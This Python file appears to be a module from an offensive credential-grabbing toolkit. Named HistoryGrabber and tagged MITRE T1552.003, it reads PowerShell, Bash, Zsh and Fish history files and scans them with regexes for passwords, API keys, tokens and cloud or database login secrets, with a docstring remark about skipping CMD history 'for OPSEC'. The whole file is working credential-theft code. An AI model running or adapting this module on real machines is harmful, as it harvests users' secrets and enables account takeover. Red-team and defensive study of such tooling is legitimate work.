"""
HistoryGrabber — Extract command history containing credentials

Targets:
- PowerShell: ConsoleHost_history.txt (users type passwords in commands!)
- Bash: .bash_history
- Zsh: .zsh_history
- CMD: doskey /history (requires subprocess — skipped for OPSEC)

Scans history for lines containing credential-like patterns:
password=, -p, --password, -Password, ConvertTo-SecureString, etc.

MITRE ATT&CK: T1552.003 (Bash History)
"""

from __future__ import annotations

import os
import re

from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel
from .utils import safe_read_text


# Patterns that indicate a line contains a credential
_CREDENTIAL_PATTERNS = [
    re.compile(p, re.IGNORECASE) for p in [
        r"(?:password|passwd|pwd)\s*[=:]\s*\S+",
        r"-(?:p|password|Password)\s+\S+",
        r"(?:api[_-]?key|token|secret)\s*[=:]\s*\S+",
        r"ConvertTo-SecureString\s",
        r"Net\s+use\s+.*\s+/user:",
        r"(?:mysql|psql|sqlcmd|mongo)\s+.*-p\s*\S+",
        r"(?:ssh|scp|rsync)\s+.*@",
        r"curl\s+.*-u\s+\S+:\S+",
        r"wget\s+.*--password",
        r"(?:aws|az|gcloud)\s+.*(?:--secret|--password|--key)",
        r"docker\s+login\s+.*-p\s+\S+",
        r"(?:export|set)\s+(?:.*(?:KEY|SECRET|TOKEN|PASS|AUTH))=\S+",
    ]
]


class HistoryGrabber(GrabberModule):
    name = "history"
    description = "Extract credentials from shell command history"
    min_privilege = PrivilegeLevel.USER
    supported_platforms = ("Windows", "Darwin", "Linux")
    default_enabled = True

    _TARGETS: list[tuple[str, str]] = [
        # PowerShell history (Windows)
        ("{appdata}/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt", "PowerShell"),
        # Unix shell histories
        ("{home}/.bash_history", "Bash"),
        ("{home}/.zsh_history", "Zsh"),
        ("{home}/.sh_history", "Shell"),
        ("{home}/.local/share/fish/fish_history", "Fish"),
        # PowerShell on Unix
        ("{home}/.local/share/powershell/PSReadLine/ConsoleHost_history.txt", "PowerShell"),
    ]

    def preflight_check(self, context: GrabberContext) -> bool:
        for template, _ in self._TARGETS:
            path = self._expand(template, context)
            if path and os.path.isfile(path):
                return True
        return False

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)

        for template, shell_name in self._TARGETS:
            path = self._expand(template, context)
            if not path or not os.path.isfile(path):
                continue

            content = safe_read_text(path, max_size=5 * 1024 * 1024)  # 5MB max
            if not content:
                continue

            creds = self._scan_history(path, content, shell_name)
            result.credentials.extend(creds)

            if creds:
                result.findings.append(self.make_finding(
                    file_path=path,
                    description=f"Found {len(creds)} credential-like command(s) in {shell_name} history",
                    score=50 * min(len(creds), 3),
                    matched_value=shell_name,
                    snippets=[c.notes[:80] for c in creds[:5]],
                ))

        result.status = GrabberStatus.COMPLETED
        return result

    def _expand(self, template: str, context: GrabberContext) -> str:
        return template.format(
            appdata=context.appdata_roaming or "",
            home=context.user_profile_path,
        )

    @staticmethod
    def _scan_history(path: str, content: str, shell_name: str) -> list[ExtractedCredential]:
        """Scan history lines for credential patterns."""
        creds = []
        seen_lines: set[str] = set()

        for line_num, line in enumerate(content.splitlines(), 1):
            line = line.strip()
            # Zsh history has timestamp prefix: ": 1234567890:0;actual command"
            if line.startswith(": ") and ";" in line:
                line = line.split(";", 1)[1]

            if not line or line in seen_lines:
                continue

            for pattern in _CREDENTIAL_PATTERNS:
                if pattern.search(line):
                    seen_lines.add(line)
                    creds.append(ExtractedCredential(
                        source_module="history",
                        credential_type="password",
                        target_application=f"{shell_name} history",
                        notes=f"line {line_num}: {line[:200]}",
                        mitre_technique="T1552.003",
                    ))
                    break

            if len(creds) >= 50:  # Cap to avoid huge results
                break

        return creds
